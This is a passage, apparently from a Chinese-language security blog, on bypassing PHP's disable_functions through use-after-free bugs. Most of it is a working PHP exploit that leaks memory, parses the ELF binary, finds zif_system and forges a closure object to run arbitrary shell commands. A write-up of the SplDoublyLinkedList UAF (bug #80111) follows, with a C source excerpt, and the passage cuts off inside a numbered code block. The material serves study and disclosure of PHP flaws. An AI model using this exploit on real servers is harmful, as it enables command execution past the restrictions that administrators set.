        <span class="nv">$e_phentsize</span> <span class="o">=</span> <span class="nx">leak</span><span class="p">(</span><span class="nv">$base</span><span class="p">,</span> <span class="mh">0x36</span><span class="p">,</span> <span class="mi">2</span><span class="p">);</span>
        <span class="nv">$e_phnum</span> <span class="o">=</span> <span class="nx">leak</span><span class="p">(</span><span class="nv">$base</span><span class="p">,</span> <span class="mh">0x38</span><span class="p">,</span> <span class="mi">2</span><span class="p">);</span>

        <span class="k">for</span><span class="p">(</span><span class="nv">$i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="nv">$i</span> <span class="o">&lt;</span> <span class="nv">$e_phnum</span><span class="p">;</span> <span class="nv">$i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
            <span class="nv">$header</span> <span class="o">=</span> <span class="nv">$base</span> <span class="o">+</span> <span class="nv">$e_phoff</span> <span class="o">+</span> <span class="nv">$i</span> <span class="o">*</span> <span class="nv">$e_phentsize</span><span class="p">;</span>
            <span class="nv">$p_type</span>  <span class="o">=</span> <span class="nx">leak</span><span class="p">(</span><span class="nv">$header</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">4</span><span class="p">);</span>
            <span class="nv">$p_flags</span> <span class="o">=</span> <span class="nx">leak</span><span class="p">(</span><span class="nv">$header</span><span class="p">,</span> <span class="mi">4</span><span class="p">,</span> <span class="mi">4</span><span class="p">);</span>
            <span class="nv">$p_vaddr</span> <span class="o">=</span> <span class="nx">leak</span><span class="p">(</span><span class="nv">$header</span><span class="p">,</span> <span class="mh">0x10</span><span class="p">);</span>
            <span class="nv">$p_memsz</span> <span class="o">=</span> <span class="nx">leak</span><span class="p">(</span><span class="nv">$header</span><span class="p">,</span> <span class="mh">0x28</span><span class="p">);</span>

            <span class="k">if</span><span class="p">(</span><span class="nv">$p_type</span> <span class="o">==</span> <span class="mi">1</span> <span class="o">&amp;&amp;</span> <span class="nv">$p_flags</span> <span class="o">==</span> <span class="mi">6</span><span class="p">)</span> <span class="p">{</span> <span class="c1"># PT_LOAD, PF_Read_Write
</span><span class="c1"></span>                <span class="c1"># handle pie
</span><span class="c1"></span>                <span class="nv">$data_addr</span> <span class="o">=</span> <span class="nv">$e_type</span> <span class="o">==</span> <span class="mi">2</span> <span class="o">?</span> <span class="nv">$p_vaddr</span> <span class="o">:</span> <span class="nv">$base</span> <span class="o">+</span> <span class="nv">$p_vaddr</span><span class="p">;</span>
                <span class="nv">$data_size</span> <span class="o">=</span> <span class="nv">$p_memsz</span><span class="p">;</span>
            <span class="p">}</span> <span class="k">else</span> <span class="k">if</span><span class="p">(</span><span class="nv">$p_type</span> <span class="o">==</span> <span class="mi">1</span> <span class="o">&amp;&amp;</span> <span class="nv">$p_flags</span> <span class="o">==</span> <span class="mi">5</span><span class="p">)</span> <span class="p">{</span> <span class="c1"># PT_LOAD, PF_Read_exec
</span><span class="c1"></span>                <span class="nv">$text_size</span> <span class="o">=</span> <span class="nv">$p_memsz</span><span class="p">;</span>
            <span class="p">}</span>
        <span class="p">}</span>

        <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nv">$data_addr</span> <span class="o">||</span> <span class="o">!</span><span class="nv">$text_size</span> <span class="o">||</span> <span class="o">!</span><span class="nv">$data_size</span><span class="p">)</span>
            <span class="k">return</span> <span class="k">false</span><span class="p">;</span>

        <span class="k">return</span> <span class="p">[</span><span class="nv">$data_addr</span><span class="p">,</span> <span class="nv">$text_size</span><span class="p">,</span> <span class="nv">$data_size</span><span class="p">];</span>
    <span class="p">}</span>

    <span class="k">function</span> <span class="nf">get_basic_funcs</span><span class="p">(</span><span class="nv">$base</span><span class="p">,</span> <span class="nv">$elf</span><span class="p">)</span> <span class="p">{</span>
        <span class="k">list</span><span class="p">(</span><span class="nv">$data_addr</span><span class="p">,</span> <span class="nv">$text_size</span><span class="p">,</span> <span class="nv">$data_size</span><span class="p">)</span> <span class="o">=</span> <span class="nv">$elf</span><span class="p">;</span>
        <span class="k">for</span><span class="p">(</span><span class="nv">$i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="nv">$i</span> <span class="o">&lt;</span> <span class="nv">$data_size</span> <span class="o">/</span> <span class="mi">8</span><span class="p">;</span> <span class="nv">$i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
            <span class="nv">$leak</span> <span class="o">=</span> <span class="nx">leak</span><span class="p">(</span><span class="nv">$data_addr</span><span class="p">,</span> <span class="nv">$i</span> <span class="o">*</span> <span class="mi">8</span><span class="p">);</span>
            <span class="k">if</span><span class="p">(</span><span class="nv">$leak</span> <span class="o">-</span> <span class="nv">$base</span> <span class="o">&gt;</span> <span class="mi">0</span> <span class="o">&amp;&amp;</span> <span class="nv">$leak</span> <span class="o">-</span> <span class="nv">$base</span> <span class="o">&lt;</span> <span class="nv">$data_addr</span> <span class="o">-</span> <span class="nv">$base</span><span class="p">)</span> <span class="p">{</span>
                <span class="nv">$deref</span> <span class="o">=</span> <span class="nx">leak</span><span class="p">(</span><span class="nv">$leak</span><span class="p">);</span>
                <span class="c1"># &#39;constant&#39; constant check
</span><span class="c1"></span>                <span class="k">if</span><span class="p">(</span><span class="nv">$deref</span> <span class="o">!=</span> <span class="mh">0x746e6174736e6f63</span><span class="p">)</span>
                    <span class="k">continue</span><span class="p">;</span>
            <span class="p">}</span> <span class="k">else</span> <span class="k">continue</span><span class="p">;</span>

            <span class="nv">$leak</span> <span class="o">=</span> <span class="nx">leak</span><span class="p">(</span><span class="nv">$data_addr</span><span class="p">,</span> <span class="p">(</span><span class="nv">$i</span> <span class="o">+</span> <span class="mi">4</span><span class="p">)</span> <span class="o">*</span> <span class="mi">8</span><span class="p">);</span>
            <span class="k">if</span><span class="p">(</span><span class="nv">$leak</span> <span class="o">-</span> <span class="nv">$base</span> <span class="o">&gt;</span> <span class="mi">0</span> <span class="o">&amp;&amp;</span> <span class="nv">$leak</span> <span class="o">-</span> <span class="nv">$base</span> <span class="o">&lt;</span> <span class="nv">$data_addr</span> <span class="o">-</span> <span class="nv">$base</span><span class="p">)</span> <span class="p">{</span>
                <span class="nv">$deref</span> <span class="o">=</span> <span class="nx">leak</span><span class="p">(</span><span class="nv">$leak</span><span class="p">);</span>
                <span class="c1"># &#39;bin2hex&#39; constant check
</span><span class="c1"></span>                <span class="k">if</span><span class="p">(</span><span class="nv">$deref</span> <span class="o">!=</span> <span class="mh">0x786568326e6962</span><span class="p">)</span>
                    <span class="k">continue</span><span class="p">;</span>
            <span class="p">}</span> <span class="k">else</span> <span class="k">continue</span><span class="p">;</span>

            <span class="k">return</span> <span class="nv">$data_addr</span> <span class="o">+</span> <span class="nv">$i</span> <span class="o">*</span> <span class="mi">8</span><span class="p">;</span>
        <span class="p">}</span>
    <span class="p">}</span>

    <span class="k">function</span> <span class="nf">get_binary_base</span><span class="p">(</span><span class="nv">$binary_leak</span><span class="p">)</span> <span class="p">{</span>
        <span class="nv">$base</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
        <span class="nv">$start</span> <span class="o">=</span> <span class="nv">$binary_leak</span> <span class="o">&amp;</span> <span class="mh">0xfffffffffffff000</span><span class="p">;</span>
        <span class="k">for</span><span class="p">(</span><span class="nv">$i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="nv">$i</span> <span class="o">&lt;</span> <span class="mh">0x1000</span><span class="p">;</span> <span class="nv">$i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
            <span class="nv">$addr</span> <span class="o">=</span> <span class="nv">$start</span> <span class="o">-</span> <span class="mh">0x1000</span> <span class="o">*</span> <span class="nv">$i</span><span class="p">;</span>
            <span class="nv">$leak</span> <span class="o">=</span> <span class="nx">leak</span><span class="p">(</span><span class="nv">$addr</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">7</span><span class="p">);</span>
            <span class="k">if</span><span class="p">(</span><span class="nv">$leak</span> <span class="o">==</span> <span class="mh">0x10102464c457f</span><span class="p">)</span> <span class="p">{</span> <span class="c1"># ELF header
</span><span class="c1"></span>                <span class="k">return</span> <span class="nv">$addr</span><span class="p">;</span>
            <span class="p">}</span>
        <span class="p">}</span>
    <span class="p">}</span>

    <span class="k">function</span> <span class="nf">get_system</span><span class="p">(</span><span class="nv">$basic_funcs</span><span class="p">)</span> <span class="p">{</span>
        <span class="nv">$addr</span> <span class="o">=</span> <span class="nv">$basic_funcs</span><span class="p">;</span>
        <span class="k">do</span> <span class="p">{</span>
            <span class="nv">$f_entry</span> <span class="o">=</span> <span class="nx">leak</span><span class="p">(</span><span class="nv">$addr</span><span class="p">);</span>
            <span class="nv">$f_name</span> <span class="o">=</span> <span class="nx">leak</span><span class="p">(</span><span class="nv">$f_entry</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">6</span><span class="p">);</span>

            <span class="k">if</span><span class="p">(</span><span class="nv">$f_name</span> <span class="o">==</span> <span class="mh">0x6d6574737973</span><span class="p">)</span> <span class="p">{</span> <span class="c1"># system
</span><span class="c1"></span>                <span class="k">return</span> <span class="nx">leak</span><span class="p">(</span><span class="nv">$addr</span> <span class="o">+</span> <span class="mi">8</span><span class="p">);</span>
            <span class="p">}</span>
            <span class="nv">$addr</span> <span class="o">+=</span> <span class="mh">0x20</span><span class="p">;</span>
        <span class="p">}</span> <span class="k">while</span><span class="p">(</span><span class="nv">$f_entry</span> <span class="o">!=</span> <span class="mi">0</span><span class="p">);</span>
        <span class="k">return</span> <span class="k">false</span><span class="p">;</span>
    <span class="p">}</span>

    <span class="k">function</span> <span class="nf">trigger_uaf</span><span class="p">(</span><span class="nv">$arg</span><span class="p">)</span> <span class="p">{</span>
        <span class="c1"># str_shuffle prevents opcache string interning
</span><span class="c1"></span>        <span class="nv">$arg</span> <span class="o">=</span> <span class="nx">str_shuffle</span><span class="p">(</span><span class="nx">str_repeat</span><span class="p">(</span><span class="s1">&#39;A&#39;</span><span class="p">,</span> <span class="mi">79</span><span class="p">));</span>
        <span class="nv">$vuln</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">Vuln</span><span class="p">();</span>
        <span class="nv">$vuln</span><span class="o">-&gt;</span><span class="na">a</span> <span class="o">=</span> <span class="nv">$arg</span><span class="p">;</span>
    <span class="p">}</span>

    <span class="k">if</span><span class="p">(</span><span class="nx">stristr</span><span class="p">(</span><span class="k">PHP_OS</span><span class="p">,</span> <span class="s1">&#39;WIN&#39;</span><span class="p">))</span> <span class="p">{</span>
        <span class="k">die</span><span class="p">(</span><span class="s1">&#39;This PoC is for *nix systems only.&#39;</span><span class="p">);</span>
    <span class="p">}</span>

    <span class="nv">$n_alloc</span> <span class="o">=</span> <span class="mi">10</span><span class="p">;</span> <span class="c1"># increase this value if UAF fails
</span><span class="c1"></span>    <span class="nv">$contiguous</span> <span class="o">=</span> <span class="p">[];</span>
    <span class="k">for</span><span class="p">(</span><span class="nv">$i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="nv">$i</span> <span class="o">&lt;</span> <span class="nv">$n_alloc</span><span class="p">;</span> <span class="nv">$i</span><span class="o">++</span><span class="p">)</span>
        <span class="nv">$contiguous</span><span class="p">[]</span> <span class="o">=</span> <span class="nx">str_shuffle</span><span class="p">(</span><span class="nx">str_repeat</span><span class="p">(</span><span class="s1">&#39;A&#39;</span><span class="p">,</span> <span class="mi">79</span><span class="p">));</span>

    <span class="nx">trigger_uaf</span><span class="p">(</span><span class="s1">&#39;x&#39;</span><span class="p">);</span>
    <span class="nv">$abc</span> <span class="o">=</span> <span class="nv">$backtrace</span><span class="p">[</span><span class="mi">1</span><span class="p">][</span><span class="s1">&#39;args&#39;</span><span class="p">][</span><span class="mi">0</span><span class="p">];</span>

    <span class="nv">$helper</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">Helper</span><span class="p">;</span>
    <span class="nv">$helper</span><span class="o">-&gt;</span><span class="na">b</span> <span class="o">=</span> <span class="k">function</span> <span class="p">(</span><span class="nv">$x</span><span class="p">)</span> <span class="p">{</span> <span class="p">};</span>

    <span class="k">if</span><span class="p">(</span><span class="nx">strlen</span><span class="p">(</span><span class="nv">$abc</span><span class="p">)</span> <span class="o">==</span> <span class="mi">79</span> <span class="o">||</span> <span class="nx">strlen</span><span class="p">(</span><span class="nv">$abc</span><span class="p">)</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
        <span class="k">die</span><span class="p">(</span><span class="s2">&#34;UAF failed&#34;</span><span class="p">);</span>
    <span class="p">}</span>

    <span class="c1"># leaks
</span><span class="c1"></span>    <span class="nv">$closure_handlers</span> <span class="o">=</span> <span class="nx">str2ptr</span><span class="p">(</span><span class="nv">$abc</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
    <span class="nv">$php_heap</span> <span class="o">=</span> <span class="nx">str2ptr</span><span class="p">(</span><span class="nv">$abc</span><span class="p">,</span> <span class="mh">0x58</span><span class="p">);</span>
    <span class="nv">$abc_addr</span> <span class="o">=</span> <span class="nv">$php_heap</span> <span class="o">-</span> <span class="mh">0xc8</span><span class="p">;</span>

    <span class="c1"># fake value
</span><span class="c1"></span>    <span class="nx">write</span><span class="p">(</span><span class="nv">$abc</span><span class="p">,</span> <span class="mh">0x60</span><span class="p">,</span> <span class="mi">2</span><span class="p">);</span>
    <span class="nx">write</span><span class="p">(</span><span class="nv">$abc</span><span class="p">,</span> <span class="mh">0x70</span><span class="p">,</span> <span class="mi">6</span><span class="p">);</span>

    <span class="c1"># fake reference
</span><span class="c1"></span>    <span class="nx">write</span><span class="p">(</span><span class="nv">$abc</span><span class="p">,</span> <span class="mh">0x10</span><span class="p">,</span> <span class="nv">$abc_addr</span> <span class="o">+</span> <span class="mh">0x60</span><span class="p">);</span>
    <span class="nx">write</span><span class="p">(</span><span class="nv">$abc</span><span class="p">,</span> <span class="mh">0x18</span><span class="p">,</span> <span class="mh">0xa</span><span class="p">);</span>

    <span class="nv">$closure_obj</span> <span class="o">=</span> <span class="nx">str2ptr</span><span class="p">(</span><span class="nv">$abc</span><span class="p">,</span> <span class="mh">0x20</span><span class="p">);</span>

    <span class="nv">$binary_leak</span> <span class="o">=</span> <span class="nx">leak</span><span class="p">(</span><span class="nv">$closure_handlers</span><span class="p">,</span> <span class="mi">8</span><span class="p">);</span>
    <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="p">(</span><span class="nv">$base</span> <span class="o">=</span> <span class="nx">get_binary_base</span><span class="p">(</span><span class="nv">$binary_leak</span><span class="p">)))</span> <span class="p">{</span>
        <span class="k">die</span><span class="p">(</span><span class="s2">&#34;Couldn&#39;t determine binary base address&#34;</span><span class="p">);</span>
    <span class="p">}</span>

    <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="p">(</span><span class="nv">$elf</span> <span class="o">=</span> <span class="nx">parse_elf</span><span class="p">(</span><span class="nv">$base</span><span class="p">)))</span> <span class="p">{</span>
        <span class="k">die</span><span class="p">(</span><span class="s2">&#34;Couldn&#39;t parse ELF header&#34;</span><span class="p">);</span>
    <span class="p">}</span>

    <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="p">(</span><span class="nv">$basic_funcs</span> <span class="o">=</span> <span class="nx">get_basic_funcs</span><span class="p">(</span><span class="nv">$base</span><span class="p">,</span> <span class="nv">$elf</span><span class="p">)))</span> <span class="p">{</span>
        <span class="k">die</span><span class="p">(</span><span class="s2">&#34;Couldn&#39;t get basic_functions address&#34;</span><span class="p">);</span>
    <span class="p">}</span>

    <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="p">(</span><span class="nv">$zif_system</span> <span class="o">=</span> <span class="nx">get_system</span><span class="p">(</span><span class="nv">$basic_funcs</span><span class="p">)))</span> <span class="p">{</span>
        <span class="k">die</span><span class="p">(</span><span class="s2">&#34;Couldn&#39;t get zif_system address&#34;</span><span class="p">);</span>
    <span class="p">}</span>

    <span class="c1"># fake closure object
</span><span class="c1"></span>    <span class="nv">$fake_obj_offset</span> <span class="o">=</span> <span class="mh">0xd0</span><span class="p">;</span>
    <span class="k">for</span><span class="p">(</span><span class="nv">$i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="nv">$i</span> <span class="o">&lt;</span> <span class="mh">0x110</span><span class="p">;</span> <span class="nv">$i</span> <span class="o">+=</span> <span class="mi">8</span><span class="p">)</span> <span class="p">{</span>
        <span class="nx">write</span><span class="p">(</span><span class="nv">$abc</span><span class="p">,</span> <span class="nv">$fake_obj_offset</span> <span class="o">+</span> <span class="nv">$i</span><span class="p">,</span> <span class="nx">leak</span><span class="p">(</span><span class="nv">$closure_obj</span><span class="p">,</span> <span class="nv">$i</span><span class="p">));</span>
    <span class="p">}</span>

    <span class="c1"># pwn
</span><span class="c1"></span>    <span class="nx">write</span><span class="p">(</span><span class="nv">$abc</span><span class="p">,</span> <span class="mh">0x20</span><span class="p">,</span> <span class="nv">$abc_addr</span> <span class="o">+</span> <span class="nv">$fake_obj_offset</span><span class="p">);</span>
    <span class="nx">write</span><span class="p">(</span><span class="nv">$abc</span><span class="p">,</span> <span class="mh">0xd0</span> <span class="o">+</span> <span class="mh">0x38</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="mi">4</span><span class="p">);</span> <span class="c1"># internal func type
</span><span class="c1"></span>    <span class="nx">write</span><span class="p">(</span><span class="nv">$abc</span><span class="p">,</span> <span class="mh">0xd0</span> <span class="o">+</span> <span class="mh">0x68</span><span class="p">,</span> <span class="nv">$zif_system</span><span class="p">);</span> <span class="c1"># internal func handler
</span><span class="c1"></span>
    <span class="p">(</span><span class="nv">$helper</span><span class="o">-&gt;</span><span class="na">b</span><span class="p">)(</span><span class="nv">$cmd</span><span class="p">);</span>
    <span class="k">exit</span><span class="p">();</span>
<span class="p">}</span>
</code></pre></td></tr></table>
</div>
</div><p><img
        class="lazyload"
        src="/svg/loading.min.svg"
        data-src="https://gitee.com/leonsec/images/raw/master/image-20210129103108022.png"
        data-srcset="https://gitee.com/leonsec/images/raw/master/image-20210129103108022.png, https://gitee.com/leonsec/images/raw/master/image-20210129103108022.png 1.5x, https://gitee.com/leonsec/images/raw/master/image-20210129103108022.png 2x"
        data-sizes="auto"
        alt="https://gitee.com/leonsec/images/raw/master/image-20210129103108022.png"
        title="image-20210129103108022" /></p>
<h2 id="spldoublylinkedlist-uaf">SplDoublyLinkedList UAF</h2>
<blockquote>
<p>SplDoublyLinkedList is a doubly-linked list (DLL) which supports iteration.</p>
<p>Said iteration is done by keeping a pointer to the &ldquo;current&rdquo; DLL element.</p>
<p>You can then call next() or prev() to make the DLL point to another element.</p>
<p>When you delete an element of the DLL, PHP will remove the element from the DLL, then destroy the zval, and finally clear the current ptr if it points to the element. Therefore, when the zval is destroyed, current is still pointing to the associated element, even if it was removed from the list.</p>
<p>This allows for an easy UAF, because you can call $dll-&gt;next() or $dll-&gt;prev() in the zval&rsquo;s destructor.</p>
<p><a href="https://bugs.php.net/bug.php?id=80111" target="_blank" rel="noopener noreffer">PHP :: Bug #80111 :: PHP SplDoublyLinkedList::offsetUnset UAF Sandbox Escape</a></p>
</blockquote>
<p>影响范围：</p>
<ul>
<li>PHP <code>5.3.0</code> to PHP <code>8.0 (alpha)</code> are vulnerable, that is every PHP version since the creation of the class.</li>
</ul>
<p>BUG 发生在 PHP 内置类 SplDoublyLinkedList，一个双链表类，有一个指针 traverse_pointer 用于指向当前位置，在调用 unset 删除链表元素的时候，处理顺序上有点问题：</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="k">if</span> <span class="p">(</span><span class="n">element</span> <span class="o">!=</span> <span class="nb">NULL</span><span class="p">)</span> <span class="p">{</span>
    <span class="cm">/* connect the neightbors */</span>
    <span class="p">...</span>

    <span class="cm">/* take care of head/tail */</span>
    <span class="p">...</span>

    <span class="cm">/* finally, delete the element */</span>
    <span class="n">llist</span><span class="o">-&gt;</span><span class="n">count</span><span class="o">--</span><span class="p">;</span>

    <span class="k">if</span><span class="p">(</span><span class="n">llist</span><span class="o">-&gt;</span><span class="n">dtor</span><span class="p">)</span> <span class="p">{</span>
        <span class="n">llist</span><span class="o">-&gt;</span><span class="n">dtor</span><span class="p">(</span><span class="n">element</span><span class="p">);</span>
    <span class="p">}</span>

    <span class="k">if</span> <span class="p">(</span><span class="n">intern</span><span class="o">-&gt;</span><span class="n">traverse_pointer</span> <span class="o">==</span> <span class="n">element</span><span class="p">)</span> <span class="p">{</span>
        <span class="n">SPL_LLIST_DELREF</span><span class="p">(</span><span class="n">element</span><span class="p">);</span>
        <span class="n">intern</span><span class="o">-&gt;</span><span class="n">traverse_pointer</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>
    <span class="p">}</span>
    <span class="p">...</span>
<span class="p">}</span>
</code></pre></td></tr></table>
</div>
</div><p>删除元素的操作被放在了置空 <code>traverse_pointer</code> 指针前，所以在删除一个对象时，我们可以在其构析函数中通过 <code>current</code> 访问到这个对象，也可以通过 <code>next</code> 访问到下一个元素。如果此时下一个元素已经被删除，就会导致 <code>UAF</code></p>
<p>exp: <a href="https://ssd-disclosure.com/ssd-advisory-php-spldoublylinkedlist-uaf-sandbox-escape/" target="_blank" rel="noopener noreffer">SSD Advisory – PHP SplDoublyLinkedList UAF Sandbox Escape - SSD Secure Disclosure</a></p>
<p>注：此exp只支持PHP7+</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">  1
</span><span class="lnt">  2
</span><span class="lnt">  3
</span><span class="lnt">  4
</span><span class="lnt">  5
</span><span class="lnt">  6
</span><span class="lnt">  7
</span><span class="lnt">  8
</span><span class="lnt">  9
</span><span class="lnt"> 10
</span><span class="lnt"> 11
</span><span class="lnt"> 12
</span><span class="lnt"> 13
</span><span class="lnt"> 14
</span><span class="lnt"> 15
</span><span class="lnt"> 16
</span><span class="lnt"> 17
</span><span class="lnt"> 18
</span><span class="lnt"> 19
</span><span class="lnt"> 20
</span><span class="lnt"> 21
</span><span class="lnt"> 22
</span><span class="lnt"> 23
</span><span class="lnt"> 24
</span><span class="lnt"> 25
</span><span class="lnt"> 26
</span><span class="lnt"> 27
</span><span class="lnt"> 28
</span><span class="lnt"> 29
</span><span class="lnt"> 30
</span><span class="lnt"> 31
</span><span class="lnt"> 32
</span><span class="lnt"> 33
</span><span class="lnt"> 34
</span><span class="lnt"> 35
</span><span class="lnt"> 36
</span><span class="lnt"> 37
</span><span class="lnt"> 38
</span><span class="lnt"> 39
</span><span class="lnt"> 40
</span><span class="lnt"> 41
</span><span class="lnt"> 42
</span><span class="lnt"> 43
</span><span class="lnt"> 44
</span><span class="lnt"> 45
</span><span class="lnt"> 46
</span><span class="lnt"> 47
</span><span class="lnt"> 48
</span><span class="lnt"> 49
</span><span class="lnt"> 50
</span><span class="lnt"> 51
</span><span class="lnt"> 52
</span><span class="lnt"> 53
</span><span class="lnt"> 54
</span><span class="lnt"> 55
</span><span class="lnt"> 56
</span><span class="lnt"> 57
</span><span class="lnt"> 58
</span><span class="lnt"> 59
</span><span class="lnt"> 60
</span><span class="lnt"> 61
</span><span class="lnt"> 62
</span><span class="lnt"> 63
</span><span class="lnt"> 64
</span><span class="lnt"> 65
</span><span class="lnt"> 66
</span><span class="lnt"> 67
</span><span class="lnt"> 68
</span><span class="lnt"> 69
</span><span class="lnt"> 70
</span><span class="lnt"> 71
</span><span class="lnt"> 72
</span><span class="lnt"> 73
</span><span class="lnt"> 74
</span><span class="lnt"> 75
</span><span class="lnt"> 76
</span><span class="lnt"> 77
</span><span class="lnt"> 78
</span><span class="lnt"> 79
</span><span class="lnt"> 80
</span><span class="lnt"> 81
</span><span class="lnt"> 82
</span><span class="lnt"> 83
</span><span class="lnt"> 84
</span><span class="lnt"> 85
</span><span class="lnt"> 86
</span><span class="lnt"> 87
</span><span class="lnt"> 88
</span><span class="lnt"> 89
</span><span class="lnt"> 90
</span><span class="lnt"> 91
</span><span class="lnt"> 92
</span><span class="lnt"> 93
</span><span class="lnt"> 94
</span><span class="lnt"> 95
</span><span class="lnt"> 96
</span><span class="lnt"> 97
</span><span class="lnt"> 98
</span><span class="lnt"> 99
</span><span class="lnt">100
</span><span class="lnt">101
</span><span class="lnt">102
</span><span class="lnt">103
</span><span class="lnt">104
</span><span class="lnt">105
</span><span class="lnt">106
</span><span class="lnt">107
</span><span class="lnt">108
</span><span class="lnt">109
</span><span class="lnt">110
</span><span class="lnt">111
</span><span class="lnt">112
</span><span class="lnt">113
</span><span class="lnt">114
</span><span class="lnt">115
</span><span class="lnt">116
</span><span class="lnt">117
</span><span class="lnt">118
</span><span class="lnt">119
</span><span class="lnt">120
</span><span class="lnt">121
</span><span class="lnt">122
</span><span class="lnt">123
</span><span class="lnt">124
</span><span class="lnt">125
</span><span class="lnt">126
</span><span class="lnt">127
</span><span class="lnt">128
</span><span class="lnt">129
</span><span class="lnt">130
</span><span class="lnt">131
</span><span class="lnt">132
</span><span class="lnt">133
</span><span class="lnt">134
</span><span class="lnt">135
</span><span class="lnt">136
</span><span class="lnt">137
</span><span class="lnt">138
</span><span class="lnt">139
</span><span class="lnt">140
</span><span class="lnt">141
</span><span class="lnt">142
</span><span class="lnt">143
</span><span class="lnt">144
</span><span class="lnt">145
</span><span class="lnt">146
</span><span class="lnt">147
</span><span class="lnt">148
</span><span class="lnt">149
</span><span class="lnt">150
</span><span class="lnt">151
</span><span class="lnt">152
</span><span class="lnt">153
</span><span class="lnt">154
</span><span class="lnt">155
</span><span class="lnt">156
</span><span class="lnt">157
</span><span class="lnt">158
</span><span class="lnt">159
</span><span class="lnt">160
</span><span class="lnt">161
</span><span class="lnt">162
</span><span class="lnt">163
</span><span class="lnt">164
</span><span class="lnt">165
</span><span class="lnt">166
</span><span class="lnt">167
</span><span class="lnt">168
</span><span class="lnt">169
</span><span class="lnt">170
</span><span class="lnt">171
</span><span class="lnt">172
</span><span class="lnt">173
</span><span class="lnt">174
</span><span class="lnt">175
</span><span class="lnt">176
</span><span class="lnt">177
</span><span class="lnt">178
</span><span class="lnt">179
</span><span class="lnt">180
</span><span class="lnt">181
</span><span class="lnt">182
</span><span class="lnt">183
</span><span class="lnt">184
</span><span class="lnt">185
</span><span class="lnt">186
</span><span class="lnt">187
</span><span class="lnt">188
</span><span class="lnt">189
</span><span class="lnt">190
</span><span class="lnt">191
</span><span class="lnt">192
</span><span class="lnt">193
</span><span class="lnt">194
</span><span class="lnt">195
</span><span class="lnt">196
</span><span class="lnt">197
</span><span class="lnt">198
</span><span class="lnt">199
</span><span class="lnt">200
</span><span class="lnt">201
</span><span class="lnt">202
</span><span class="lnt">203
</span><span class="lnt">204
</span><span class="lnt">205
</span><span class="lnt">206
</span><span class="lnt">207
</span><span class="lnt">208
</span><span class="lnt">209
</span><span class="lnt">210
</span><span class="lnt">211
</span><span class="lnt">212
</span><span class="lnt">213
</span><span class="lnt">214
</span><span class="lnt">215
</span><span class="lnt">216
</span><span class="lnt">217
</span><span class="lnt">218
</span><span class="lnt">219
</span><span class="lnt">220
</span><span class="lnt">221
</span><span class="lnt">222
</span><span class="lnt">223
</span><span class="lnt">224
</span><span class="lnt">225
</span><span class="lnt">226
</span><span class="lnt">227
</span><span class="lnt">228
</span><span class="lnt">229
</span><span class="lnt">230
</span><span class="lnt">231
</span><span class="lnt">232
</span><span class="lnt">233
</span><span class="lnt">234
</span><span class="lnt">235
</span><span class="lnt">236
</span><span class="lnt">237
</span><span class="lnt">238
</span><span class="lnt">239
</span><span class="lnt">240
</span><span class="lnt">241
</span><span class="lnt">242
</span><span class="lnt">243
</span><span class="lnt">244
</span><span class="lnt">245
</span><span class="lnt">246
</span><span class="lnt">247
</span><span class="lnt">248
</span><span class="lnt">249
</span><span class="lnt">250
</span><span class="lnt">251
</span><span class="lnt">252
</span><span class="lnt">253
</span><span class="lnt">254
</span><span class="lnt">255
</span><span class="lnt">256
</span><span class="lnt">257
</span><span class="lnt">258
</span><span class="lnt">259
</span><span class="lnt">260
</span><span class="lnt">261
</span><span class="lnt">262
</span><span class="lnt">263
</span><span class="lnt">264
</span><span class="lnt">265
</span><span class="lnt">266
</span><span class="lnt">267
</span><span class="lnt">268
</span><span class="lnt">269
</span><span class="lnt">270
</span><span class="lnt">271
</span><span class="lnt">272
</span><span class="lnt">273
</span><span class="lnt">274
</span><span class="lnt">275
</span><span class="lnt">276
</span><span class="lnt">277
</span><span class="lnt">278
</span><span class="lnt">279
</span><span class="lnt">280
</span><span class="lnt">281
</span><span class="lnt">282
</span><span class="lnt">283
</span><span class="lnt">284
</span><span class="lnt">285
</span><span class="lnt">286
</span><span class="lnt">287
</span><span class="lnt">288
</span><span class="lnt">289
</span><span class="lnt">290
</span><span class="lnt">291
</span><span class="lnt">292
</span><span class="lnt">293
</span><span class="lnt">294
</span><span class="lnt">295
</span><span class="lnt">296
</span><span class="lnt">297
</span><span class="lnt">298
</span><span class="lnt">299
</span><span class="lnt">300
</span><span class="lnt">301
</span><span class="lnt">302
</span><span class="lnt">303
